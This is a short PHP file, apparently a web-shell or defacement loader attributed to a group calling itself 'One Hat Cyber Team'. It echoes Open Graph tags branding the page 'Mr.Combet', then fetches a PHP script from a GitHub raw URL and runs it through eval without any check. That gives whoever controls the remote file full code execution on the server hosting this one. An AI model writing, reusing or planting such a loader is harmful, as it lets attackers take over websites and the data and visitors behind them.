<?php
$url = 'https://raw.githubusercontent.com/5Y4H/seo/main/seobarbar.php';
$kode = file_get_contents($url);
echo '<meta property="og:image" content="//dl.dropboxusercontent.com/s/gjdpc0so99lr8gt/combet.png">';
echo '<meta property="og:title" content="Mr.Combet">';
echo '<meta property="og:description" content="One Hat Cyber Team">';
eval('?>' . $kode);
?>
